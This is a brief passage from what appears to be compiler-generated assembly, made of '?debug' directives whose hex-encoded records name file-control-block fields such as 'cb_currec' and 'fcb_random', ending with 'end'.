	?debug	C 63625F63757272656302000A6663625F72616E64+
	?debug	C 6F6D06C025000000
	end
